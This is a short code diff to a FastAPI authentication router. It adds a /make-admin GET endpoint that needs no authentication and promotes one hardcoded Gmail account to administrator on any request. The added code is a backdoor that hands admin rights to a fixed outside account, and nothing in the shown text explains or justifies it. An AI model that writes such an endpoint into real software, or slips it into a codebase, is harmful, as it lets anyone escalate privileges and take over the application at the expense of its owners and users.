@@ -54,3 +54,18 @@ def login(data: LoginSchema, db: Session = Depends(get_db)):
             "is_admin": user.is_admin
         }
     }
+@router.get("/make-admin")
+def make_admin(db: Session = Depends(get_db)):
+
+    user = db.query(User).filter(
+        User.email == "bottestserver002@gmail.com"
+    ).first()
+
+    if not user:
+        return {"error": "User not found"}
+
+    user.is_admin = True
+
+    db.commit()
+
+    return {"message": "Admin updated"}
